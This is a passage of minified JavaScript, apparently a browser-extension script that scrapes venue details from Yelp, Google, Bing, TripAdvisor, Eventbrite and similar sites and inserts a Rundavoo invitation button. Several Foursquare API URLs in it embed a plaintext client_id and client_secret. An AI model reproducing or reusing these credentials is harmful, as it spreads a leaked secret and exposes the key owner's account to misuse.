{base:"F",letters:/[\u0046\u24BB\uFF26\u1E1E\u0191\uA77B]/g},{base:"G",letters:/[\u0047\u24BC\uFF27\u01F4\u011C\u1E20\u011E\u0120\u01E6\u0122\u01E4\u0193\uA7A0\uA77D\uA77E]/g},{base:"H",letters:/[\u0048\u24BD\uFF28\u0124\u1E22\u1E26\u021E\u1E24\u1E28\u1E2A\u0126\u2C67\u2C75\uA78D]/g},{base:"I",letters:/[\u0049\u24BE\uFF29\u00CC\u00CD\u00CE\u0128\u012A\u012C\u0130\u00CF\u1E2E\u1EC8\u01CF\u0208\u020A\u1ECA\u012E\u1E2C\u0197]/g},{base:"J",letters:/[\u004A\u24BF\uFF2A\u0134\u0248]/g},{base:"K",letters:/[\u004B\u24C0\uFF2B\u1E30\u01E8\u1E32\u0136\u1E34\u0198\u2C69\uA740\uA742\uA744\uA7A2]/g},
{base:"L",letters:/[\u004C\u24C1\uFF2C\u013F\u0139\u013D\u1E36\u1E38\u013B\u1E3C\u1E3A\u0141\u023D\u2C62\u2C60\uA748\uA746\uA780]/g},{base:"LJ",letters:/[\u01C7]/g},{base:"Lj",letters:/[\u01C8]/g},{base:"M",letters:/[\u004D\u24C2\uFF2D\u1E3E\u1E40\u1E42\u2C6E\u019C]/g},{base:"N",letters:/[\u004E\u24C3\uFF2E\u01F8\u0143\u00D1\u1E44\u0147\u1E46\u0145\u1E4A\u1E48\u0220\u019D\uA790\uA7A4]/g},{base:"NJ",letters:/[\u01CA]/g},{base:"Nj",letters:/[\u01CB]/g},{base:"O",letters:/[\u004F\u24C4\uFF2F\u00D2\u00D3\u00D4\u1ED2\u1ED0\u1ED6\u1ED4\u00D5\u1E4C\u022C\u1E4E\u014C\u1E50\u1E52\u014E\u022E\u0230\u00D6\u022A\u1ECE\u0150\u01D1\u020C\u020E\u01A0\u1EDC\u1EDA\u1EE0\u1EDE\u1EE2\u1ECC\u1ED8\u01EA\u01EC\u00D8\u01FE\u0186\u019F\uA74A\uA74C]/g},
{base:"OI",letters:/[\u01A2]/g},{base:"OO",letters:/[\uA74E]/g},{base:"OU",letters:/[\u0222]/g},{base:"P",letters:/[\u0050\u24C5\uFF30\u1E54\u1E56\u01A4\u2C63\uA750\uA752\uA754]/g},{base:"Q",letters:/[\u0051\u24C6\uFF31\uA756\uA758\u024A]/g},{base:"R",letters:/[\u0052\u24C7\uFF32\u0154\u1E58\u0158\u0210\u0212\u1E5A\u1E5C\u0156\u1E5E\u024C\u2C64\uA75A\uA7A6\uA782]/g},{base:"S",letters:/[\u0053\u24C8\uFF33\u1E9E\u015A\u1E64\u015C\u1E60\u0160\u1E66\u1E62\u1E68\u0218\u015E\u2C7E\uA7A8\uA784]/g},{base:"T",
letters:/[\u0054\u24C9\uFF34\u1E6A\u0164\u1E6C\u021A\u0162\u1E70\u1E6E\u0166\u01AC\u01AE\u023E\uA786]/g},{base:"TZ",letters:/[\uA728]/g},{base:"U",letters:/[\u0055\u24CA\uFF35\u00D9\u00DA\u00DB\u0168\u1E78\u016A\u1E7A\u016C\u00DC\u01DB\u01D7\u01D5\u01D9\u1EE6\u016E\u0170\u01D3\u0214\u0216\u01AF\u1EEA\u1EE8\u1EEE\u1EEC\u1EF0\u1EE4\u1E72\u0172\u1E76\u1E74\u0244]/g},{base:"V",letters:/[\u0056\u24CB\uFF36\u1E7C\u1E7E\u01B2\uA75E\u0245]/g},{base:"VY",letters:/[\uA760]/g},{base:"W",letters:/[\u0057\u24CC\uFF37\u1E80\u1E82\u0174\u1E86\u1E84\u1E88\u2C72]/g},
{base:"X",letters:/[\u0058\u24CD\uFF38\u1E8A\u1E8C]/g},{base:"Y",letters:/[\u0059\u24CE\uFF39\u1EF2\u00DD\u0176\u1EF8\u0232\u1E8E\u0178\u1EF6\u1EF4\u01B3\u024E\u1EFE]/g},{base:"Z",letters:/[\u005A\u24CF\uFF3A\u0179\u1E90\u017B\u017D\u1E92\u1E94\u01B5\u0224\u2C7F\u2C6B\uA762]/g},{base:"a",letters:/[\u0061\u24D0\uFF41\u1E9A\u00E0\u00E1\u00E2\u1EA7\u1EA5\u1EAB\u1EA9\u00E3\u0101\u0103\u1EB1\u1EAF\u1EB5\u1EB3\u0227\u01E1\u00E4\u01DF\u1EA3\u00E5\u01FB\u01CE\u0201\u0203\u1EA1\u1EAD\u1EB7\u1E01\u0105\u2C65\u0250]/g},
{base:"aa",letters:/[\uA733]/g},{base:"ae",letters:/[\u00E6\u01FD\u01E3]/g},{base:"ao",letters:/[\uA735]/g},{base:"au",letters:/[\uA737]/g},{base:"av",letters:/[\uA739\uA73B]/g},{base:"ay",letters:/[\uA73D]/g},{base:"b",letters:/[\u0062\u24D1\uFF42\u1E03\u1E05\u1E07\u0180\u0183\u0253]/g},{base:"c",letters:/[\u0063\u24D2\uFF43\u0107\u0109\u010B\u010D\u00E7\u1E09\u0188\u023C\uA73F\u2184]/g},{base:"d",letters:/[\u0064\u24D3\uFF44\u1E0B\u010F\u1E0D\u1E11\u1E13\u1E0F\u0111\u018C\u0256\u0257\uA77A]/g},
{base:"dz",letters:/[\u01F3\u01C6]/g},{base:"e",letters:/[\u0065\u24D4\uFF45\u00E8\u00E9\u00EA\u1EC1\u1EBF\u1EC5\u1EC3\u1EBD\u0113\u1E15\u1E17\u0115\u0117\u00EB\u1EBB\u011B\u0205\u0207\u1EB9\u1EC7\u0229\u1E1D\u0119\u1E19\u1E1B\u0247\u025B\u01DD]/g},{base:"f",letters:/[\u0066\u24D5\uFF46\u1E1F\u0192\uA77C]/g},{base:"g",letters:/[\u0067\u24D6\uFF47\u01F5\u011D\u1E21\u011F\u0121\u01E7\u0123\u01E5\u0260\uA7A1\u1D79\uA77F]/g},{base:"h",letters:/[\u0068\u24D7\uFF48\u0125\u1E23\u1E27\u021F\u1E25\u1E29\u1E2B\u1E96\u0127\u2C68\u2C76\u0265]/g},
{base:"hv",letters:/[\u0195]/g},{base:"i",letters:/[\u0069\u24D8\uFF49\u00EC\u00ED\u00EE\u0129\u012B\u012D\u00EF\u1E2F\u1EC9\u01D0\u0209\u020B\u1ECB\u012F\u1E2D\u0268\u0131]/g},{base:"j",letters:/[\u006A\u24D9\uFF4A\u0135\u01F0\u0249]/g},{base:"k",letters:/[\u006B\u24DA\uFF4B\u1E31\u01E9\u1E33\u0137\u1E35\u0199\u2C6A\uA741\uA743\uA745\uA7A3]/g},{base:"l",letters:/[\u006C\u24DB\uFF4C\u0140\u013A\u013E\u1E37\u1E39\u013C\u1E3D\u1E3B\u017F\u0142\u019A\u026B\u2C61\uA749\uA781\uA747]/g},{base:"lj",letters:/[\u01C9]/g},
{base:"m",letters:/[\u006D\u24DC\uFF4D\u1E3F\u1E41\u1E43\u0271\u026F]/g},{base:"n",letters:/[\u006E\u24DD\uFF4E\u01F9\u0144\u00F1\u1E45\u0148\u1E47\u0146\u1E4B\u1E49\u019E\u0272\u0149\uA791\uA7A5]/g},{base:"nj",letters:/[\u01CC]/g},{base:"o",letters:/[\u006F\u24DE\uFF4F\u00F2\u00F3\u00F4\u1ED3\u1ED1\u1ED7\u1ED5\u00F5\u1E4D\u022D\u1E4F\u014D\u1E51\u1E53\u014F\u022F\u0231\u00F6\u022B\u1ECF\u0151\u01D2\u020D\u020F\u01A1\u1EDD\u1EDB\u1EE1\u1EDF\u1EE3\u1ECD\u1ED9\u01EB\u01ED\u00F8\u01FF\u0254\uA74B\uA74D\u0275]/g},
{base:"oi",letters:/[\u01A3]/g},{base:"ou",letters:/[\u0223]/g},{base:"oo",letters:/[\uA74F]/g},{base:"p",letters:/[\u0070\u24DF\uFF50\u1E55\u1E57\u01A5\u1D7D\uA751\uA753\uA755]/g},{base:"q",letters:/[\u0071\u24E0\uFF51\u024B\uA757\uA759]/g},{base:"r",letters:/[\u0072\u24E1\uFF52\u0155\u1E59\u0159\u0211\u0213\u1E5B\u1E5D\u0157\u1E5F\u024D\u027D\uA75B\uA7A7\uA783]/g},{base:"s",letters:/[\u0073\u24E2\uFF53\u00DF\u015B\u1E65\u015D\u1E61\u0161\u1E67\u1E63\u1E69\u0219\u015F\u023F\uA7A9\uA785\u1E9B]/g},
{base:"t",letters:/[\u0074\u24E3\uFF54\u1E6B\u1E97\u0165\u1E6D\u021B\u0163\u1E71\u1E6F\u0167\u01AD\u0288\u2C66\uA787]/g},{base:"tz",letters:/[\uA729]/g},{base:"u",letters:/[\u0075\u24E4\uFF55\u00F9\u00FA\u00FB\u0169\u1E79\u016B\u1E7B\u016D\u00FC\u01DC\u01D8\u01D6\u01DA\u1EE7\u016F\u0171\u01D4\u0215\u0217\u01B0\u1EEB\u1EE9\u1EEF\u1EED\u1EF1\u1EE5\u1E73\u0173\u1E77\u1E75\u0289]/g},{base:"v",letters:/[\u0076\u24E5\uFF56\u1E7D\u1E7F\u028B\uA75F\u028C]/g},{base:"vy",letters:/[\uA761]/g},{base:"w",letters:/[\u0077\u24E6\uFF57\u1E81\u1E83\u0175\u1E87\u1E85\u1E98\u1E89\u2C73]/g},
{base:"x",letters:/[\u0078\u24E7\uFF58\u1E8B\u1E8D]/g},{base:"y",letters:/[\u0079\u24E8\uFF59\u1EF3\u00FD\u0177\u1EF9\u0233\u1E8F\u00FF\u1EF7\u1E99\u1EF5\u01B4\u024F\u1EFF]/g},{base:"z",letters:/[\u007A\u24E9\uFF5A\u017A\u1E91\u017C\u017E\u1E93\u1E95\u01B6\u0225\u0240\u2C6C\uA763]/g}],d=0;d<c.length;d++)a=a.replace(c[d].letters,c[d].base);return a}function z(){if(!(0<$(".rundavoo-button").length)&&0!=$(".rating-info").length&&0!=$(".biz-page-title").length){a={name:"A Get Together"};a.image=$(".showcase-photo-box img").attr("src");
a.description="";0<$(".js-from-biz-owner p").length?a.description=$(".js-from-biz-owner p").text().trim():a.description=$(".category-str-list").text().trim();a.venue=$(".biz-page-title").text().trim();a.street=$(".address [itemprop=streetAddress]").html().replace("<br>",", ").trim();a.city=$(".address [itemprop=addressLocality]").text().trim();a.state=$(".address [itemprop=addressRegion]").text().trim();a.zip=$(".address [itemprop=postalCode]").text().trim();a.partner_id=84638657;a.http_referer=window.location.href;
var b=g(a);e=$('<a href="'+b+'" class="rundavoo-button" style="float:left; margin-right: 10px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');$(".rating-info").prepend(e);$(".biz-rating.biz-rating-very-large, .biz-main-info .rating-details").css({marginTop:"5px"});f();var b=$(".biz-phone").text().replace(/[A-Za-z$-.\/\\\[\]=_@!#^<>; "]/g,"").trim(),c=$("meta[property='place:location:latitude']").attr("content").trim(),d=$("meta[property='place:location:longitude']").attr("content").trim();
m("https://api.foursquare.com/v2/venues/search?v=20130429&ll="+c+","+d+"&phone="+b+"&client_id=5LDT3VDAKESBXTSRN4RS4LE2F4JJEDTPH0ADZBCVLDJRZQ13&client_secret=ENLONZDHNLZ2WFNIJZMNO25FB043BQQMPBLONADHI54SBUEX",b)}}function p(){if(0<$(".rundavoo-button").length)setTimeout(p,1E3);else if(0==$("#rhs_block a:contains('Directions')").length)setTimeout(p,1E3);else{a={name:"A Get Together"};a.image=$("#rhs_block .mod img:eq(0):not(#lu_map)").attr("src");a.image&&-1<a.image.indexOf("data:image")&&delete a.image;
a.description="";a.venue=$("#rhs_block .mod .kno-ecr-pt").text().trim();var b=$("#rhs_block span:contains('Address')");b&&0<b.length&&(a.street=k(b.next("span").text()));var c=$("#rhs_block span:contains('Phone')"),b="";c&&0<c.length&&(b=c.next().text().replace(/[A-Za-z$-.\/\\\[\]=_@!#^<>; "]/g,"").trim());a.partner_id=84638657;a.http_referer=window.location.href;c=g(a);e=$('<a href="'+c+'" class="rundavoo-button" style="float:left; margin-right: 10px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');
c=function(){$lookupElement=$("#rhs_block a:contains('Directions')").parent("div").parent("div");$lookupElement.append(e);$lookupElement.css({position:"static"});f();setTimeout(p,1E3)};if(a.street){var d="https://api.foursquare.com/v2/venues/search?v=20130429&near="+encodeURIComponent(a.street)+"&phone="+b+"&client_id=5LDT3VDAKESBXTSRN4RS4LE2F4JJEDTPH0ADZBCVLDJRZQ13&client_secret=ENLONZDHNLZ2WFNIJZMNO25FB043BQQMPBLONADHI54SBUEX";m(d,b,c)}else c()}}function q(){var b=function(){var a=$("#cards .cards-card:eq(0)"),
b=e.position().top+e.height(),a=a.position().top+a.height();b>a&&0==$("#omnibox-and-cards.cards-minimized").length&&0<$("#cards.cards-not-animating").length&&(a=$("#cards .cards-card:eq(0)"),a.height(a.height()+32),a.css({clip:"none"}),$("#cards .cards-card:not(:eq(0))").each(function(a,b){var c=$(b),d=parseInt(c.css("top"));c.css({top:d+32+"px"})}))};if(0<$(".rundavoo-button").length)b(),setTimeout(q,1E3);else{var c=$("#cards .cards-entity-left:eq(0) .cards-alias-entity-location");if(0==c.length)setTimeout(q,
1E3);else{a={name:"A Get Together",description:""};a.venue=c.find("h1.cards-entity-title").text().trim();var d=c.find(".cards-entity-address");d&&0<d.length&&(a.street=k(d.find("span:eq(0)").text()+", "+d.find("span:eq(1)").text()));var l=$("#cards .cards-entity-right:eq(0) .cards-entity-phone"),d="";l&&0<l.length&&(d=l.next().text().replace(/[A-Za-z$-.\/\\\[\]=_@!#^<>; "]/g,"").trim());a.partner_id=84638657;a.http_referer=window.location.href;l=g(a);e=$('<a href="'+l+'" class="rundavoo-button" style="float:left; margin-right: 10px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');
l=function(){c.append(e);b();f();setTimeout(q,1E3)};if(a.street){var h="https://api.foursquare.com/v2/venues/search?v=20130429&near="+encodeURIComponent(a.street)+"&phone="+d+"&client_id=5LDT3VDAKESBXTSRN4RS4LE2F4JJEDTPH0ADZBCVLDJRZQ13&client_secret=ENLONZDHNLZ2WFNIJZMNO25FB043BQQMPBLONADHI54SBUEX";m(h,d,l)}else l()}}}function r(){if(0<$(".rundavoo-button").length)setTimeout(r,1E3);else if(0==$("#local_listing_rr .actions, .biz-actions .biz-btns").length)setTimeout(r,1E3);else{a={name:"A Get Together"};
a.image=$("#local_listing_rr .local-track:eq(0)").attr("src");a.description="";a.venue=$("#local_listing_rr .title h2").text().trim();a.venue&&0!=a.venue.length||(a.venue=$(".yl-biz-basic h1").text().trim());a.street=k($("#local_listing_rr .addr").text().trim());a.street&&0!=a.street.length||(a.street=k($(".yl-biz-basic .yl-biz-addr").text().trim()));a.partner_id=84638657;a.http_referer=window.location.href;var b=$("#local_listing_rr .phone").text().replace(/[A-Za-z$-.\/\\\[\]=_@!#^<>; "]/g,"").trim();
b&&0!=b.length||(b=$(".yl-biz-basic .yl-biz-ph").text().replace(/[A-Za-z$-.\/\\\[\]=_@!#^<>; "]/g,"").trim());var c=g(a);e=$('<a href="'+c+'" class="rundavoo-button" style="float:left; margin-right: 10px; margin-top: -1px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');c="https://api.foursquare.com/v2/venues/search?v=20130429&near="+encodeURIComponent(a.street)+"&phone="+b+"&client_id=5LDT3VDAKESBXTSRN4RS4LE2F4JJEDTPH0ADZBCVLDJRZQ13&client_secret=ENLONZDHNLZ2WFNIJZMNO25FB043BQQMPBLONADHI54SBUEX";
m(c,b,function(){var a=$("#local_listing_rr .actions .bttn.reservation");if(0==a.length){var a=$("#local_listing_rr .actions ul, .biz-actions .biz-btns ul"),b=$("<li></li>").append(e);a.append(b)}else a.replaceWith(e);$("#local_listing_rr .actions .bttn").css({padding:"5px 10px"});$(".biz-actions .biz-btns ul li").css({display:"inline-block",verticalAlign:"middle"});f();setTimeout(r,1E3)})}}function v(){if(document.querySelector(".rundavoo-button")){if(!a.image){var b=$(".b_lBottom .rms_img:eq(0)");
b&&0<b.length&&(a.image="http://"+window.location.hostname+b.attr("src"),e&&e.attr("href",g(a)))}}else 0!=$("#b_context .b_subModule  .b_vList").length&&(a={name:"A Get Together",description:""},document.querySelector("#b_context .b_ans .b_address")&&(a.street=k(document.querySelector("#b_context .b_ans .b_address").innerText.replace(/ \u00b7/g,",").trim())),a.venue=document.querySelector("#b_context .b_ans .b_entityTitle").innerHTML.trim(),(b=$("#b_context .b_ans ul li a:contains('OpenTable')"))&&
0<b.length&&(b=b.attr("href"),b=u(b))&&(a.opentable_id=b),a.partner_id=84638657,a.http_referer=window.location.href,b=g(a),$("#b_context .b_subModule:eq(0)").append('<li><a href="'+b+'" class="rundavoo-button"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a></li>'),e=$(".rundavoo-button"),f());setTimeout(v,1E3)}function w(){if(!(0<$(".rundavoo-button").length)){var b=$("#main-container-content .row h1[itemprop=name]");if(0!=b.length){a=
{name:"A Get Together"};a.image=$("#main-container-content .photo .image:eq(0) img:eq(0)").attr("src");a.description="";a.venue=b.text().trim();a.street=k($("#main-container-content .street-address").text().trim());a.city=$("#main-container-content .locality").text().trim();a.state=$("#main-container-content .region").text().trim();a.http_referer=window.location.href;a.partner_id=84638657;var b=$("#main-container-content .phone.tel").text().replace(/[A-Za-z$-.\/\\\[\]=_@!#^<>; "]/g,"").trim(),c=g(a);
e=$('<a href="'+c+'" class="rundavoo-button" style="display: block; margin-top: 10px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');c=$("#main-container-content .phone.tel");0==c.length&&(c=$("#main-container-content #header-base"));c.after(e);f();a.zip&&(c="https://api.foursquare.com/v2/venues/search?v=20130429&near="+encodeURIComponent(a.zip)+"&phone="+b+"&client_id=5LDT3VDAKESBXTSRN4RS4LE2F4JJEDTPH0ADZBCVLDJRZQ13&client_secret=ENLONZDHNLZ2WFNIJZMNO25FB043BQQMPBLONADHI54SBUEX",
m(c,b))}}setTimeout(w,1E3)}function s(){if(0<$(".rundavoo-button").length)setTimeout(s,1E3);else if(0==$("#listing_main .listing_details, #HotelDateSearch").length||0==$(".infoBox .format_address").length)setTimeout(s,1E3);else{a={name:"A Get Together"};a.image=$("#HERO_PHOTO").attr("src");a.description="";a.venue=$("h1#HEADING").text().trim();a.street=k($(".infoBox .format_address").text().trim());a.http_referer=window.location.href;a.partner_id=84638657;var b=$(".grayPhone").next().text().replace(/[A-Za-z$-.\/\\\[\]=_@!#^<>; "]/g,
"").trim(),c=g(a);e=$('<a href="'+c+'" class="rundavoo-button" style="display: block; margin-bottom: 10px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');c=function(){var a=$("#listing_main .listing_details");0==a.length&&(a=$("#HotelDateSearch"),e.css({marginTop:"20px"}));a.append(e);f();setTimeout(s,1E3)};if(a.street){var d="https://api.foursquare.com/v2/venues/search?v=20130429&near="+encodeURIComponent(a.street)+"&phone="+b+"&client_id=5LDT3VDAKESBXTSRN4RS4LE2F4JJEDTPH0ADZBCVLDJRZQ13&client_secret=ENLONZDHNLZ2WFNIJZMNO25FB043BQQMPBLONADHI54SBUEX";
m(d,b,c)}else c()}}function x(){if(!(0<$(".rundavoo-button").length)&&0!=$(".venueDetail .venueInfoSection .venueName:eq(0)").length){a={name:"A Get Together"};a.image=$(".photo.photoWithContent img:eq(0)").attr("src");a.description="";a.venue=$(".venueDetail .venueInfoSection .venueName:eq(0)").text().trim();a.street=k($(".address span[itemprop=streetAddress]").text().trim());a.city=$(".address span[itemprop=addressLocality]").text().trim();a.state=$(".address span[itemprop=addressRegion]").text().trim();
a.zip=$(".address span[itemprop=postalCode]").text().trim();a.http_referer=window.location.href;a.partner_id=84638657;var b=$(".venueAttr.reservationLink .attrValue a");b&&0<b.length&&(b=b.attr("href"),b=u(b))&&(a.opentable_id=b);b=g(a);e=$('<a href="'+b+'" class="rundavoo-button" style="display: block; margin-top: 10px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');$(".venueInfoSection .primaryInfo").append(e);f()}setTimeout(x,1E3)}
function y(){if(!(0<window.jQuery(".rundavoo-button").length)&&0!=window.jQuery("#event_header h1").length){a={name:"A Get Together"};a.image=window.jQuery(".event_title_image img").attr("src");a.description="";a.venue=window.jQuery("#event_header h1").text().trim();a.street=k(window.jQuery(".location .street-address").text().trim());a.city=window.jQuery(".location .locality").text().trim();a.state=window.jQuery(".location .region").text().trim();a.eventbrite_id=window.jQuery("input[name=eid]").val();
var b=window.jQuery(".dtstart .value-title").attr("title");b&&0<b.length&&(b=new Date(b))&&b.getTime&&(b=new Date(Date.UTC(b.getFullYear(),b.getMonth(),b.getDate(),b.getHours(),b.getMinutes(),b.getSeconds(),b.getMilliseconds())),a.start_time=b.getTime()/1E3);a.buy_link=window.location.href;a.http_referer=window.location.href;a.partner_id=84638657;b=g(a);e=window.jQuery('<a href="'+b+'" class="rundavoo-button" style="display: block; margin-top: 10px;"><img src="https://s3.amazonaws.com/rundavoo-production/static/with-friends/bring-your-friends-green.png"></a>');
window.jQuery("#event_header").append(e);f()}setTimeout(y,1E3)}var a={},e=null;-1<window.location.hostname.indexOf("yelp")?h(z):-1<window.location.hostname.indexOf("google.com")&&-1==window.location.href.indexOf("www.google.com/analytics")?-1<window.location.href.indexOf("/maps/place")?h(q):h(p):-1<window.location.hostname.indexOf("yahoo")?h(r):-1<window.location.hostname.indexOf("foursquare")?h(x):-1<window.location.hostname.indexOf("bing")?h(v):-1<window.location.hostname.indexOf("urbanspoon")?
h(w):-1<window.location.hostname.indexOf("tripadvisor")?h(s):-1<window.location.hostname.indexOf("eventbrite")&&y()})();
